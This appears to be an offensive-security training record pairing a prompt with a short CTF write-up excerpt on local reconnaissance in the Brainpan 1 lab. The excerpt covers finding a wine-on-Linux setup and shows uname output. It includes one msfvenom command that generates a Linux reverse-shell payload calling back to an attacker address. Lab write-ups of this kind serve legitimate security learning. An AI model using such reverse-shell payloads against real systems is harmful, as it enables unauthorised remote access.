# UNCATEGORIZED — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: uncategorized

## Scenario

Describe the 'Local Reconnaissance' technique used in 'Brainpan 1'.

## Analysis / Response

# Local Reconnaissance

For some reason, `systeminfo` doesn't seem to work

Interestingly, it appears that we are on a linux file system. 

We can type `c:` to get to the windows machine drive, but it doesn't look like a real windows filesystem.

Looking at the `checksrv.sh` file, the following line indicates that this is actually running the program through wine on linux with a bash script:
`	/usr/bin/wine /home/puck/web/bin/brainpan.exe &`

The new payload can be generated with `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.0.114 LPORT=4444 -f python -b='\x00'`

Running `uname -a` shows us the following:

```
Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
```
